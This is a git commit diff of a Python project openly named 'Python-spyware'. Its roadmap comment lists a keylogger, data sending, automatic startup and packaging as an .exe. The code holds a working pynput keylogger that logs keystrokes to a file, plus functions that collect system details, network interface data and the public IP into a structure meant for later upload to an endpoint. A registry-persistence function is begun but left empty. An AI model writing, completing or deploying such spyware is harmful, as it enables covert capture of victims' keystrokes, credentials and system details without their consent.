d46a7cdbab8988a2a6335bd648bc4e9541c4043d
Jorge Duarte <jorge.duarte@edubox.pt>
2020-01-21 12:12:08 +0000

    added a senddataobject to submit to a endpoint later on.

--- main.py
+++ main.py
@@ -1,7 +1,8 @@
 #1. System Information [Done]
 #2. Keylogger [Done]
-#3. Data Sending
-#4. Automatic execution on system startup
+#3. Data to send [Done]
+
+#4. Automatic execution on system startup [Doing]
 #5. Convert code to an image/.exe application
 
 #requirements (windows)
@@ -9,6 +10,7 @@
 # -> python -m pip install psutil
 # -> python -m pip install requests
 # -> python -m pip install pynput
+# -> python -m pip install --upgrade pip
 
 import platform
 import psutil
@@ -17,93 +19,104 @@ from requests import get
 from pynput import keyboard
 from time import strftime,gmtime
 import datetime
+import json
 import os
 
+isWindowsOS = 0
 keyloggerfiledir = "C:\\Users\\jorge.duarte\\Desktop\\Python-spyware\\output.txt"
+senddata = { 'network' : [], 'system' : '' , 'ipaddress' : '' }
+
+
 
 def ExecKeyLogger_OnKeyPress(key):
-    print(datetime.datetime.now().strftime("%H:%M:%S"))
     try:
         f=open(keyloggerfiledir,"a")
         f.write(key.char)
-        #schedule.every(1).minutes.do(sendmail)
-        print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
-        print('special key {0} pressed'.format(key))
-        #print(keyboard.KeyCode)
         if key==keyboard.Key.space:
             f.write(' ')
         if key==keyboard.Key.enter:
             f.write(os.linesep)
         if key==keyboard.Key.backspace:
-            #f.seek(-1,os.SEEK_CUR)
             f.write('')
     except:
       print('Failed to catch numnomeric key')
+
 
 def ExecKeyLogger_OnRelease(key):
     if int(datetime.datetime.now().strftime("%H")) not in range(8,23):
         return False
 
 def GetExternalIP():
-    ip = get('https://api.ipify.org').text
-    print 'My public IP address is:', ip
+    try:
+        ip = get('https://api.ipify.org').text
+        senddata['ipaddress'] = ip
+    except:
+        print 'failed to retrieve public ip'
 
 
 def get_size(bytes, suffix="B"):
-    """
-    Scale bytes to its proper format
-    e.g:
-        1253656 => '1.20MB'
-        1253656678 => '1.17GB'
-    """
     factor = 1024
     for unit in ["", "K", "M", "G", "T", "P"]:
         if bytes < factor:
-            return"bytes: " + unit + suffix;
-        #{bytes:.2f}{unit}{suffix}"
+            return str(bytes) + " " + unit + suffix;
         bytes /= factor
 
+
+
 def GetSystemInformation():
-    print("="*40, "System Information", "="*40)
+    #print("="*40, "System Information", "="*40)
     uname = platform.uname()
-    print uname;
+    senddata['system'] = uname;
 
 def NetworkInformation():
-    print("="*40, "Network Information", "="*40)
+    #print("="*40, "Network Information", "="*40)
     # get all network interfaces (virtual and physical)
     if_addrs = psutil.net_if_addrs()
     for interface_name, interface_addresses in if_addrs.items():
         for address in interface_addresses:
-            print("=== Interface: "+interface_name+" ===")
-            
-            if str(address.family) == '2':
-                if(address.address):
-                    print("  IP Address: " + address.address)
-                if(address.netmask):
-                    print("  Netmask: "+ address.netmask)
-                if(address.broadcast):
-                    print("  Broadcast IP: " + address.broadcast)
-            elif str(address.family) == '-1':
-                if(address.address):
-                    print("  MAC Address: " + address.address)
-                if(address.netmask):
-                    print("  Netmask: " + address.netmask)
-                if(address.broadcast):
-                    print("  Broadcast MAC: " + address.broadcast)
-            else: # family 23 == ipv6?
-                print(address)
+            senddata['network'].append(address);
+            #print("=== Interface: "+interface_name+" ===")
+            #if str(address.family) == '2':
+            #    if(address.address):
+            #       print("  IP Address: " + address.address)
+            #    if(address.netmask):
+            #        print("  Netmask: "+ address.netmask)
+            #    if(address.broadcast):
+            #        print("  Broadcast IP: " + address.broadcast)
+            #elif str(address.family) == '-1':
+            #    if(address.address):
+            #        print("  MAC Address: " + address.address)
+            #    if(address.netmask):
+            #        print("  Netmask: " + address.netmask)
+            #    if(address.broadcast):
+            #        print("  Broadcast MAC: " + address.broadcast)
+            #else: # family 23 == ipv6?
+            #    print(address)
     # get IO statistics since boot
     net_io = psutil.net_io_counters()
-    print("Total Bytes Sent: " + get_size(net_io.bytes_sent))
-    print("Total Bytes Received: " + get_size(net_io.bytes_recv))
-         
+    #print("Total Bytes Sent: " + get_size(net_io.bytes_sent))
+    #print("Total Bytes Received: " + get_size(net_io.bytes_recv))
+
+    
+def AddToRegistry():
+    pth = os.path.dirname(os.path.realpath(__file__))
+    ##print(pth);
+    
+        
 GetSystemInformation()
 NetworkInformation()
-#GetExternalIP()
+AddToRegistry()
+GetExternalIP()
 
-try:
-    with keyboard.Listener(on_press=ExecKeyLogger_OnKeyPress,on_release=ExecKeyLogger_OnRelease) as listener:
-        listener.join()
-except:
-    print("fix this ****")
+jstr = json.dumps(senddata, indent=4)
+print(jstr);
+
+
+#activate keylogger 
+
+#try:
+#    with keyboard.Listener(on_press=ExecKeyLogger_OnKeyPress,on_release=ExecKeyLogger_OnRelease) as listener:
+#        listener.join()
+#except:
+#    print("fix this ****")
